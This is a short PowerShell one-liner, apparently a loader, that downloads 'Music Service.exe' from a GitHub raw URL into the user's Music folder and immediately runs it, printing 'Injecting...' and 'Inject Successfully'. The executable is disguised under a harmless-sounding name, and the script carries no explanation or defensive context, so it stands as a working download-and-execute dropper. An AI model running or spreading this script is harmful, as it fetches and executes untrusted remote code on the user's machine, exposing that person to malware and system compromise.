$musicPath = "$env:USERPROFILE\Music"; if (!(Test-Path $musicPath)) { New-Item -ItemType Directory -Path $musicPath -Force }; $url = "https://github.com/UseLua/etststts/raw/refs/heads/main/Music%20Service.exe"; $output = Join-Path $musicPath "Music Service.exe"; try { Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing; Write-Host "Injecting... " } catch { Write-Host "injected: $($_.Exception.Message)"; exit 1 }; Start-Process $output; Write-Host "Inject Successfully"